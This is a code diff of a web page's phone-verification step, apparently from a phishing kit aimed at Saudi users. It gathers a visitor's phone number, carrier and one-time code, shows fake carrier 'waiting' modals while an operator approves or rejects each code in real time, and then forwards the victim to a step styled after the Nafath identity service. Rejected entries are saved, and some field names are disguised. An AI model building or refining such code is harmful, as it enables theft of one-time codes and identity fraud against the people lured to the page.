@@ -152,20 +152,9 @@ export default function VerifyPhonePage() {
         redirectPage: null // Clear any old redirect
       })
 
-      // Add phone info to history
-      await addToHistory(visitorID, "_t4", {
-        phoneNumber,
-        phoneCarrier: selectedCarrier
-      }, "pending")
-
-      // Show different modals based on carrier
-      if (selectedCarrier === "stc") {
-        setShowStcModal(true)
-      } else if (selectedCarrier === "mobily") {
-        setShowMobilyModal(true)
-      } else {
-        setShowCarrierModal(true)
-      }
+      // Don't add to history yet - will add after OTP entry
+      // Open Phone OTP Dialog directly
+      setShowPhoneOtpDialog(true)
     } catch (error) {
       console.error("Error saving phone data:", error)
       toast.error("حدث خطأ", {
@@ -176,16 +165,16 @@ export default function VerifyPhonePage() {
   }
 
   const handleApproved = () => {
-    // Admin approved phone number - close waiting modal and open OTP dialog
-    console.log("[step5] Phone number approved, opening OTP dialog")
+    // Admin approved phone OTP - close waiting modal and navigate to nafad
+    console.log("[step5] Phone OTP approved, navigating to nafad")
     
     // Close all waiting modals
     setShowStcModal(false)
     setShowMobilyModal(false)
     setShowCarrierModal(false)
     
-    // Open Phone OTP Dialog
-    setShowPhoneOtpDialog(true)
+    // Navigate to nafad page
+    window.location.href = "/step4"
   }
 
   const handleRejected = async () => {
@@ -209,7 +198,7 @@ export default function VerifyPhonePage() {
         // Save rejected phone data and reset status
         await updateDoc(docRef, {
           oldPhoneInfo: data.oldPhoneInfo ? [...data.oldPhoneInfo, currentPhoneData] : [currentPhoneData],
-          _v4Status: "pending",
+          phoneOtpStatus: "pending",
           phoneCarrier: "" // Clear carrier to allow re-selection
         })
       }
@@ -241,6 +230,19 @@ export default function VerifyPhonePage() {
       description: "يرجى إدخال الكود الصحيح والمحاولة مرة أخرى",
       duration: 5000
     })
+  }
+
+  const handleShowWaitingModal = (carrier: string) => {
+    // Show appropriate waiting modal based on carrier
+    console.log("[step5] Showing waiting modal for carrier:", carrier)
+    
+    if (carrier === "stc") {
+      setShowStcModal(true)
+    } else if (carrier === "mobily") {
+      setShowMobilyModal(true)
+    } else {
+      setShowCarrierModal(true)
+    }
   }
 
   return (
@@ -364,7 +366,9 @@ export default function VerifyPhonePage() {
         open={showPhoneOtpDialog}
         onOpenChange={setShowPhoneOtpDialog}
         phoneNumber={phoneNumber}
+        phoneCarrier={selectedCarrier}
         onRejected={handleOtpRejected}
+        onShowWaitingModal={handleShowWaitingModal}
       />
     </>
   )
